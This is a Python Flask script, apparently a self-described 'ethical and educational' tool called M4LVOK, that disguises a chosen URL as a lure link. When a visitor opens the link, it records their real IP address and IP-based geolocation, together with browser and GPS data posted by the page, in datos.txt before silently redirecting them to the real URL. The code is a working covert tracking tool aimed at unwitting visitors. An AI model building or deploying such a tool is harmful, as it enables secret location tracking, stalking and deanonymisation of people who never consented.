import os
import subprocess
import sys
import time
import platform

# ─── 1. Verificar e instalar dependencias según sistema ─────────────────────────
def instalar_dependencias():
    paquetes = ["flask", "requests"]
    for paquete in paquetes:
        try:
            __import__(paquete)
        except ImportError:
            print(f"📦 Instalando {paquete}...")
            comando = [sys.executable, "-m", "pip", "install", paquete]
            try:
                subprocess.check_call(comando)
            except subprocess.CalledProcessError:
                print(f"❌ No se pudo instalar {paquete}. Verifica tu conexión o permisos.")

instalar_dependencias()

# ─── 2. Banner GENESIS ────────────────────────────────────────────────────
os.system('cls' if os.name == 'nt' else 'clear')
print(r'''
  __  __ _  _   _ __      ______  _  __
 |  \/  | || | | |\ \    / / __ \| |/ /
 | \  / | || |_| | \ \  / / |  | | ' / 
 | |\/| |__   _| |  \ \/ /| |  | |  <  
 | |  | |  | | | |___\  / | |__| | . \ 
 |_|  |_|  |_| |______\/   \____/|_|\_\
 
  Proyecto ético y educativo — M4LVOK
      🌿🌳 Un lugar de origen 🌳🌿
    🌿🌳 Sígueme en TikTok & YT 🌳🌿
     ───────────────────────────
    🍎   🍐   🍇   🌾   🌻   🌴   🌼
''')
time.sleep(1)

# ─── 3. Código principal ────────────────────────────────────────────────────────

from flask import Flask, request, render_template, jsonify
from datetime import datetime
import json
import requests

# Solicitar URL a camuflar
url_global = input("🔗 Ingresa la URL que deseas camuflar y rastrear: ").strip()

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html', url=url_global)

@app.route('/recolectar', methods=['POST'])
def recolectar():
    datos = request.get_json()
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Detectar IP real 
    forwarded_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_real = forwarded_ip.split(',')[0].strip()

    # Obtener info desde IPWHO
    try:
        response = requests.get(f"https://ipwho.is/{ip_real}")
        ipinfo = response.json()
    except Exception as e:
        ipinfo = {"error": f"No se pudo obtener datos IP: {str(e)}"}

    # Guardar todo en datos.txt
    with open('datos.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n--- ACCESO {fecha} ---\n")
        f.write(f"IP Pública: {ip_real}\n")
        f.write("🔹 Datos por IP:\n")
        f.write(json.dumps(ipinfo, indent=2, ensure_ascii=False))
        f.write("\n🔹 Datos por navegador/GPS:\n")
        f.write(json.dumps(datos, indent=2, ensure_ascii=False))
        f.write("\n------------------------\n")

    return jsonify({'redirigir_a': url_global})

if __name__ == '__main__':
    print(f"\n🌐 Ejecutando servidor en http://localhost:5000\n")
    app.run(host='0.0.0.0', port=5000)
